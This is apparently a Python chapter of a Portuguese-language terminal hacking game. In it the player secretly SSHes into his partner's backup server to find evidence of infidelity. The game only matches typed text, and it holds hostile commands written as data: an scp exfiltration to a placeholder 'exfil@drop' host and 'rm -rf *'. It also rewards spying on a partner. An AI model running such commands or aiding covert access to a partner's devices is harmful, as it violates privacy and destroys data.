#!/usr/bin/env python3
"""
CHAPTER_01.PY - "O Protocolo da Traição"
Brasília, 02:47 AM. O quarto escuro, apenas o brilho azulado do laptop.
Juliana dorme ao seu lado, alheia. Há semanas de suspeitas. Hoje, a verdade.

Foco: Hacking emocional, invasão de servidor pessoal
Habilidade: SSH, manipulação de arquivos
Momento-chave: Descoberta dos arquivos do Hotel Nobile
Decisão Crítica: Preservar ou destruir as evidências?
"""

import os
import sys
import time
import random
import json
import shutil
from datetime import datetime
from pathlib import Path

# Importar dependências
try:
    from utils.terminal_kali import C
except ImportError:
    class C:
        VERDE = '\033[92m'
        VERMELHO = '\033[91m'
        BRANCO = '\033[97m'
        CINZA = '\033[90m'
        CIANO = '\033[96m'
        AMARELO = '\033[93m'
        ROXO = '\033[95m'
        NEGRITO = '\033[1m'
        RESET = '\033[0m'


# ========== GERENCIADOR DE ESTADO DO JOGO ==========

class GameState:
    """Gerencia o estado durante o capítulo"""
    
    def __init__(self, dados_jogador):
        self.player_name = dados_jogador.get('player_name', 'Neo')
        self.codinome = dados_jogador.get('codiname', 'SHADOW_00')
        self.bitcoin_wallet = dados_jogador.get('bitcoin_wallet', 0.005)
        self.privacy_level = dados_jogador.get('privacy_level', 80)
        self.reputation = dados_jogador.get('reputation', 0)
        self.score = dados_jogador.get('score', 0)
        
        # Estado do capítulo
        self.erros = 0
        self.max_erros = 3
        self.game_over = False
        self.capitulo_concluido = False
        self.decisao_final = None
        self.operacao_sucesso = False
        self.saindo_para_menu = False
        
        # Checkpoint
        self.checkpoint = dados_jogador.get('chapter_01_checkpoint', 'inicio')
        
        # Histórico
        self.comandos_digitados = []
        self.historico_mensagens = []
    
    def registrar_falha(self, penalidade=5):
        """Registra uma falha e aplica penalidade"""
        self.erros += 1
        self.privacy_level = max(0, self.privacy_level - penalidade)
        
        if self.erros >= self.max_erros:
            self.game_over = True
    
    def registrar_sucesso(self, bonus=10):
        """Registra sucesso e aplica bônus"""
        self.score += bonus
        self.privacy_level = min(100, self.privacy_level + (bonus // 2))
    
    def to_dict(self):
        """Converte para dicionário para salvar"""
        return {
            'player_name': self.player_name,
            'codiname': self.codinome,
            'current_chapter': 2,
            'completed_chapters': [1],
            'score': self.score,
            'bitcoin_wallet': self.bitcoin_wallet,
            'privacy_level': self.privacy_level,
            'reputation': self.reputation,
            'darknet_access': False,
            'inventory': [],
            'last_seen': datetime.now().isoformat(),
            'capitulo_1_resultado': self.decisao_final,
            'capitulo_1_operacao_sucesso': self.operacao_sucesso,
            'chapter_01_checkpoint': self.checkpoint
        }


# ========== EFEITOS VISUAIS ==========

def limpar_tela():
    """Limpa a tela do terminal"""
    os.system('cls' if os.name == 'nt' else 'clear')


def obter_largura_terminal():
    """Obtém a largura do terminal"""
    try:
        return shutil.get_terminal_size().columns
    except:
        return 100



# Usar a função padronizada de digitação do utils
from utils.terminal_kali import digitar as _digitar_padrao

def digitar(texto, delay=0.01, cor=C.BRANCO, fim="\n"):
    """Wrapper compatível que encaminha para `utils.terminal_kali.digitar`."""
    return _digitar_padrao(texto, delay=delay, cor=cor, fim=fim)


def sucesso(mensagem):
    """Mostra mensagem de sucesso"""
    print(f"{C.VERDE}[✓] {mensagem}{C.RESET}")
    time.sleep(0.5)


def erro(mensagem):
    """Mostra mensagem de erro"""
    print(f"{C.VERMELHO}[!] {mensagem}{C.RESET}")
    time.sleep(0.5)


def aviso(mensagem):
    """Mostra mensagem de aviso"""
    print(f"{C.AMARELO}[*] {mensagem}{C.RESET}")
    time.sleep(0.3)


def prompt_kali(codinome):
    """Retorna o prompt do terminal Kali"""
    return f"{C.VERDE}root@kali{C.RESET}:~{C.VERDE}#{C.RESET} "


# ========== CABEÇALHOS E CENAS ==========

def header_kali_v2():
    """Cabeçalho bonito do Kali Linux"""
    limpar_tela()
    largura = obter_largura_terminal()
    
    print(f"{C.VERDE}{'═' * largura}{C.RESET}")
    print(f"{C.CIANO}{C.NEGRITO}{'[ROOT EVOLUTION - CAPÍTULO 1: PROTOCOLO TRAIÇÃO]':^{largura}}{C.RESET}")
    print(f"{C.CINZA}{'Brasília, 02:47 AM | Terminal: Kali Linux 2024':^{largura}}{C.RESET}")
    print(f"{C.VERDE}{'═' * largura}{C.RESET}")
    print()
    print(f"{C.AMARELO}💡 DICA: Digite {C.RESET}{C.VERMELHO}'menu'{C.RESET}{C.AMARELO} para retornar ao menu do jogo a qualquer momento.{C.RESET}")
    print(f"{C.AMARELO}📖 Acesse{C.RESET}{C.VERMELHO}'manual'{C.RESET}{C.AMARELO}para consultar o Manual de Hacking durante o jogo.{C.RESET}")
    print(f"{C.VERDE}{'═' * largura}{C.RESET}\n")


def exibir_proximidade(estagio):
    """Exibe visualmente o quão perto Juliana está"""
    estagios = [
        "[ ○○○○○○○○○ ]   Juliana ainda dorme...",
        "[ ●○○○○○○○○ ]   Juliana está mexendo na cama...",
        "[ ●●○○○○○○○ ]   Juliana calçou os chinelos...",
        "[ ●●●○○○○○○ ]   Ela está caminhando pelo corredor...",
        "[ ●●●●○○○○○ ]   Ela está colocando a mão na maçaneta...",
        "[ ●●●●●○○○○ ]   A PORTA ESTÁ ABRINDO!",
        "[ ●●●●●●●●● ]   ELA ESTÁ ATRÁS DE VOCÊ!"
    ]
    
    idx = min(estagio, len(estagios) - 1)
    cor = C.VERMELHO if estagio >= 5 else (C.AMARELO if estagio >= 3 else C.CINZA)
    
    print(f"\n{cor}{C.NEGRITO}PROXIMIDADE DE JULIANA:{C.RESET}")
    print(f"{cor}{estagios[idx]}{C.RESET}\n")


def mostrar_arquivos_descobertos():
    """Mostra os arquivos encontrados no servidor"""
    print(f"\n{C.VERMELHO}─────────────────────────────────────────────────────{C.RESET}")
    print(f"{C.VERMELHO}.conversa_hotel_nobile.pdf{C.RESET} | {C.VERMELHO}.fotos_reserva_dupla.zip{C.RESET}")
    print(f"{C.VERMELHO}─────────────────────────────────────────────────────{C.RESET}")
    print()
    time.sleep(2)
    
    print(f"{C.NEGRITO}{C.VERMELHO}* MALDIÇÃO... O RANGER DA CAMA... JULIANA ACORDOU! *{C.RESET}")
    time.sleep(1.5)
    
    digitar(f"\n{C.BRANCO}Juliana: '...Amor? Ainda acordado? O que você está fazendo?'{C.RESET}", cor=C.BRANCO, delay=0.05)
    time.sleep(1)


# ========== SISTEMA DE PROMPTS ==========

def prompt_until(cmd_expect, pensamento, state, fatigue=5, arquivo_save=None):
    """Solicita um comando específico até acertar. Digite 'menu' para voltar ao menu salvando."""
    tentativas = 0
    max_tentativas = 3
    
    while True:
        print(f"\n{C.CINZA}# DICA: {pensamento}{C.RESET}")
        
        try:
            cmd = input(prompt_kali(state.codinome)).strip()
        except KeyboardInterrupt:
            print(f"\n{C.VERMELHO}[!] CONEXÃO INTERROMPIDA{C.RESET}")
            state.game_over = True
            return False
        except EOFError:
            return False
        
        # Comando para voltar ao menu
        if cmd.lower() == 'menu':
            print(f"\n{C.AMARELO}[*] Salvando checkpoint e retornando ao menu...{C.RESET}")
            if arquivo_save:
                try:
                    Path("saves").mkdir(exist_ok=True)
                    with open(arquivo_save, 'w', encoding='utf-8') as f:
                        json.dump(state.to_dict(), f, indent=2, ensure_ascii=False)
                    print(f"{C.VERDE}[✓] Progresso salvo!{C.RESET}")
                except Exception as e:
                    print(f"{C.VERMELHO}[!] Erro ao salvar: {e}{C.RESET}")
            time.sleep(0.5)
            state.saindo_para_menu = True
            return False
        
        # Comando para acessar manual
        if cmd.lower() in ['manual', 'help', '?']:
            try:
                from manual_hacking import exibir_banner
                exibir_banner()
            except:
                print(f"{C.CINZA}Manual não disponível{C.RESET}")
            print(f"\n{C.AMARELO}[*] VOCÊ PERDEU TEMPO CONSULTANDO O MANUAL!{C.RESET}")
            state.erros += 1
            if state.game_over:
                return False
            continue
        
        # Validar comando
        if cmd == cmd_expect:
            sucesso("Comando executado com sucesso!")
            state.registrar_sucesso(10)
            return True
        else:
            tentativas += 1
            state.registrar_falha(fatigue)
            state.comandos_digitados.append(cmd)
            
            if tentativas >= max_tentativas:
                erro("Muitas tentativas erradas!")
                return False
            
            erro(f"Comando incorreto. ({tentativas}/{max_tentativas})")
            print(f"{C.VERMELHO}[!] Ela ouviu o barulho do teclado e se levantou da cama!{C.RESET}")
            time.sleep(0.3)


def prompt_sob_pressao(cmd_expect, state, escolha_nome, fase_inicial=0, arquivo_save=None):
    """Desafio sob pressão temporal. Digite 'menu' para voltar ao menu."""
    estagio_atual = fase_inicial
    limite_estagios = 6
    tentativas = 0
    
    print(f"\n{C.NEGRITO}{C.BRANCO}{'═' * 60}{C.RESET}")
    print(f"{C.NEGRITO}{C.BRANCO}{'ALERTA: ELA ESTÁ VINDO!':^60}{C.RESET}")
    print(f"{C.NEGRITO}{C.BRANCO}{'═' * 60}{C.RESET}")
    print(f"{C.CINZA}Tarefa: {escolha_nome}{C.RESET}")
    print(f"{C.CINZA}(digite 'menu' para retornar ao menu de jogo){C.RESET}")
    
    while estagio_atual < limite_estagios:
        exibir_proximidade(estagio_atual)
        print(f"{C.VERDE}# COMANDO ALVO: {C.CIANO}{cmd_expect}{C.RESET}")
        
        try:
            cmd = input(f"{C.VERMELHO}>>> {C.RESET}" + prompt_kali(state.codinome)).strip()
        except (KeyboardInterrupt, EOFError):
            state.game_over = True
            return "GAMEOVER"
        
        # Comando para voltar ao menu
        if cmd.lower() == 'menu':
            print(f"\n{C.AMARELO}[*] Salvando checkpoint e retornando ao menu...{C.RESET}")
            if arquivo_save:
                try:
                    Path("saves").mkdir(exist_ok=True)
                    with open(arquivo_save, 'w', encoding='utf-8') as f:
                        json.dump(state.to_dict(), f, indent=2, ensure_ascii=False)
                    print(f"{C.VERDE}[✓] Progresso salvo!{C.RESET}")
                except Exception as e:
                    print(f"{C.VERMELHO}[!] Erro ao salvar: {e}{C.RESET}")
            time.sleep(0.5)
            state.saindo_para_menu = True
            return "MENU"
        
        # Manual
        if cmd.lower() in ['manual', 'help']:
            try:
                from manual_hacking import exibir_banner
                exibir_banner()
            except:
                pass
            print(f"{C.VERMELHO}[!] VOCÊ PERDEU TEMPO COM O MANUAL!{C.RESET}")
            estagio_atual += 2
            state.erros += 1
            continue
        
        # Comando correto
        if cmd == cmd_expect:
            sucesso("OPERAÇÃO BEM-SUCEDIDA!")
            state.registrar_sucesso(15)
            return "SUCESSO"
        
        # Comando errado
        tentativas += 1
        estagio_atual += 1
        state.registrar_falha(5)
        state.comandos_digitados.append(cmd)
        
        print(f"{C.VERMELHO}{C.NEGRITO}[!] COMANDO INVÁLIDO! ELA OUVIU!{C.RESET}")
        time.sleep(0.5)
    
    return "TIMEOUT"


# ========== CENA PRINCIPAL ==========

def iniciar(dados_jogador, arquivo_save):
    """
    Função principal do Capítulo 1
    
    Args:
        dados_jogador: Dicionário com dados do personagem
        arquivo_save: Caminho do arquivo de save
    
    Returns:
        Dicionário com dados atualizados do jogador
    """
    
    # Inicializar estado
    state = GameState(dados_jogador)
    
    # ========== ABERTURA ==========
    
    header_kali_v2() 
    
    print()
    time.sleep(0.5)
    
    digitar(f"{C.CIANO}O café esfriou há horas. O silêncio é quebrado apenas pelo cooler do PC...{C.RESET}", 
            delay=0.08, cor=C.CIANO)
    time.sleep(1)
    
    digitar(f"{C.CIANO}Juliana dorme ao meu lado. Ela tem andado muito distante ultimamente.{C.RESET}", 
            delay=0.08, cor=C.CIANO)
    time.sleep(1)

    digitar(f"{C.CIANO}Eu não deveria fazer isso, mas a minha desconfiança me leva a isso...{C.RESET}", 
            delay=0.08, cor=C.CIANO)
    time.sleep(1)
    
    print(f"\n{C.CINZA}{'─' * 73}{C.RESET}")
    time.sleep(0.8)
    
    # ========== PARTE 1: INVESTIGAÇÃO ==========
    
    aviso("Iniciando sequência de hacking...")
    print()
    
    # SSH ao servidor de backup
    if not prompt_until(
        "ssh admin@backup-cloud",
        "Vou conectar ao servidor remoto usando SSH: ssh admin@backup-cloud",
        state,
        arquivo_save=arquivo_save
    ):
        if state.saindo_para_menu:
            return state.to_dict()
        return state.to_dict()
    
    time.sleep(0.5)
    
    # Entrar na pasta Private
    if not prompt_until(
        "cd Private",
        "Agora vou mudar de pasta (cd) e entrar em Private: cd Private",
        state,
        arquivo_save=arquivo_save
    ):
        if state.saindo_para_menu:
            return state.to_dict()
        return state.to_dict()
    
    time.sleep(0.3)
    
    # Listar arquivos ocultos
    if not prompt_until(
        "ls -a",
        "Preciso listar todos os arquivos com ls -a (mostra ocultos que começam com ponto)",
        state,
        arquivo_save=arquivo_save
    ):
        if state.saindo_para_menu:
            return state.to_dict()
        return state.to_dict()
    
    time.sleep(1)
    
    # ========== DESCOBERTA ==========
    
    mostrar_arquivos_descobertos()
    
    time.sleep(1.2)
    
    digitar(f"{C.VERMELHO}DROGA! Ela está vindo em direção à mesa! RÁPIDO!{C.RESET}", 
            delay=0.08, cor=C.VERMELHO)
    
    time.sleep(1)
    
    # ========== DECISÃO SOB PRESSÃO ==========
    
    print(f"\n{C.NEGRITO}{C.BRANCO}{'═' * 60}{C.RESET}")
    print(f"{C.NEGRITO}{C.BRANCO}{'DECISÃO CRÍTICA SOB PRESSÃO':^60}{C.RESET}")
    print(f"{C.NEGRITO}{C.BRANCO}{'═' * 60}{C.RESET}")
    
    print(f"\n{C.AMARELO}[1]{C.RESET} EXFILTRAR (Copiar evidências via SCP)")
    print(f"{C.AMARELO}[2]{C.RESET} DESTRUIR (Limpar tudo com RM -RF)")
    print()
    
    escolha = ""
    while escolha not in ["1", "2"]:
        try:
            escolha = input(f"{C.VERMELHO}[ESCOLHA 1 ou 2]: {C.RESET}").strip()
        except (KeyboardInterrupt, EOFError):
            state.game_over = True
            return state.to_dict()
    
    print()
    
    # ========== SEQUÊNCIAS FINAIS ==========
    
    if escolha == "1":
        # ========== FINAL A: EXFILTRAR ==========
        state.decisao_final = "exfiltrar"
        
        print(f"{C.AMARELO}[*] MODO ESCOLHIDO: EXFILTRAÇÃO{C.RESET}\n")
        time.sleep(0.3)
        
        resultado = prompt_sob_pressao(
            "scp .conversa_hotel_nobile.pdf exfil@drop:~/",
            state,
            "Exfiltrando Evidências Críticas",
            fase_inicial=2,
            arquivo_save=arquivo_save
        )
        
        if resultado == "MENU":
            return state.to_dict()
        
        if resultado == "SUCESSO":
            sucesso("Arquivo transferido com sucesso!")
            time.sleep(0.5)
            
            digitar(f"\n{C.CIANO}Você fecha o notebook no exato segundo em que ela toca no seu ombro.{C.RESET}", 
                    delay=0.05, cor=C.CIANO)
            time.sleep(0.8)
            
            digitar(f"{C.BRANCO}Juliana: 'Vem dormir, amor... você trabalha demais.'{C.RESET}", 
                    delay=0.05, cor=C.BRANCO)
            time.sleep(0.8)
            
            digitar(f"{C.CIANO}Ela não tem ideia. As provas estão seguras. Agora começa o verdadeiro jogo.{C.RESET}", 
                    delay=0.05, cor=C.CIANO)
            time.sleep(1)
            
            state.capitulo_concluido = True
            state.operacao_sucesso = True
            state.registrar_sucesso(50)
            
        elif resultado == "TIMEOUT":
            print(f"\n{C.VERMELHO}Tarde demais... Você ouve a maçaneta virando lentamente atrás de você.{C.RESET}")
            time.sleep(1.5)
            
            limpar_tela()
            header_kali_v2()
            
            print(f"\n{C.VERMELHO}{C.NEGRITO}{'═' * 60}{C.RESET}")
            print(f"{C.VERMELHO}{C.NEGRITO}{'   VOCÊ FOI DESCOBERTO':^60}{C.RESET}")
            print(f"{C.VERMELHO}{C.NEGRITO}{'═' * 60}{C.RESET}")
            
            time.sleep(0.5)
            
            digitar(f"\n{C.BRANCO}Juliana olha o monitor. Seus olhos ficam vermelhos.{C.RESET}", 
                    delay=0.05, cor=C.BRANCO)
            time.sleep(0.8)
            
            digitar(f"{C.BRANCO}Juliana: 'Então é isso que você faz enquanto eu durmo? VOCÊ INVADIU MEU COMPUTADOR?'{C.RESET}", 
                    delay=0.05, cor=C.BRANCO)
            time.sleep(1)
            
            digitar(f"{C.VERMELHO}A relação acabou naquela noite.{C.RESET}", 
                    delay=0.05, cor=C.VERMELHO)
            time.sleep(1)
            
            state.registrar_falha(100)
    
    else:
        # ========== FINAL B: DESTRUIR ==========
        state.decisao_final = "destruir"
        
        print(f"{C.AMARELO}[*] MODO ESCOLHIDO: DESTRUIÇÃO{C.RESET}\n")
        time.sleep(0.3)
        
        resultado = prompt_sob_pressao(
            "rm -rf *",
            state,
            "Apagando Evidências Permanentemente",
            fase_inicial=2,
            arquivo_save=arquivo_save
        )
        
        if resultado == "MENU":
            return state.to_dict()
        
        if resultado == "SUCESSO":
            sucesso("Sistema de arquivos limpo!")
            time.sleep(0.5)
            
            digitar(f"\n{C.CIANO}Você fecha o notebook no exato segundo em que ela toca no seu ombro.{C.RESET}", 
                    delay=0.05, cor=C.CIANO)
            time.sleep(0.8)
            
            digitar(f"{C.BRANCO}Juliana: 'Vem dormir, amor... você trabalha demais.'{C.RESET}", 
                    delay=0.05, cor=C.BRANCO)
            time.sleep(0.8)
            
            digitar(f"{C.CINZA}Ela não suspeita de nada. As evidências se foram. Mas agora você sabe a verdade.{C.RESET}", 
                    delay=0.05, cor=C.CINZA)
            time.sleep(1)
            
            digitar(f"{C.VERMELHO}E essa verdade nunca sairá de você.{C.RESET}", 
                    delay=0.05, cor=C.VERMELHO)
            time.sleep(1)
            
            state.capitulo_concluido = True
            state.operacao_sucesso = True
            state.registrar_sucesso(50)
        
        elif resultado == "TIMEOUT":
            print(f"\n{C.VERMELHO}Tarde demais... A porta abre atrás de você.{C.RESET}")
            time.sleep(1.5)
            
            limpar_tela()
            header_kali_v2()
            
            print(f"\n{C.VERMELHO}{C.NEGRITO}{'═' * 60}{C.RESET}")
            print(f"{C.VERMELHO}{C.NEGRITO}{'   CAPTURADO EM FLAGRANTE':^60}{C.RESET}")
            print(f"{C.VERMELHO}{C.NEGRITO}{'═' * 60}{C.RESET}")
            
            time.sleep(0.5)
            
            digitar(f"\n{C.BRANCO}Juliana vê o terminal aberto. Seus olhos explodem em lágrimas.{C.RESET}", 
                    delay=0.05, cor=C.BRANCO)
            time.sleep(0.8)
            
            digitar(f"{C.BRANCO}Juliana: 'Você estava deletando tudo? Meu Deus... por quanto tempo?'{C.RESET}", 
                    delay=0.05, cor=C.BRANCO)
            time.sleep(1)
            
            digitar(f"{C.VERMELHO}A ira dela é pior que qualquer acusação.{C.RESET}", 
                    delay=0.05, cor=C.VERMELHO)
            time.sleep(1)
            
            state.registrar_falha(100)
    
    # ========== ENCERRAMENTO ==========
    
    print()
    input(f"\n{C.BRANCO}[Pressione ENTER para desconectar...]{C.RESET}")
    
    # Atualizar dados do jogador
    dados_atualizados = state.to_dict()
    
    # Salvar progresso
    try:
        Path("saves").mkdir(exist_ok=True)
        
        if arquivo_save:
            with open(arquivo_save, 'w', encoding='utf-8') as f:
                json.dump(dados_atualizados, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"{C.VERMELHO}[!] Erro ao salvar: {e}{C.RESET}")
    
    return dados_atualizados


# ========== PONTO DE ENTRADA ==========

if __name__ == "__main__":
    # Dados de teste
    dados_teste = {
        'player_name': 'Pedro',
        'codiname': 'SHADOW_42',
        'current_chapter': 1,
        'completed_chapters': [],
        'score': 0,
        'inventory': [],
        'bitcoin_wallet': 0.005,
        'privacy_level': 80,
        'darknet_access': False,
        'reputation': 0,
        'last_seen': datetime.now().isoformat()
    }
    
    resultado = iniciar(dados_teste, None)
    
    print(f"\n{C.VERDE}Capítulo 1 concluído!{C.RESET}")
    print(f"Resultado: {resultado.get('capitulo_1_resultado', 'N/A')}")
    print(f"Sucesso: {resultado.get('capitulo_1_operacao_sucesso', False)}")
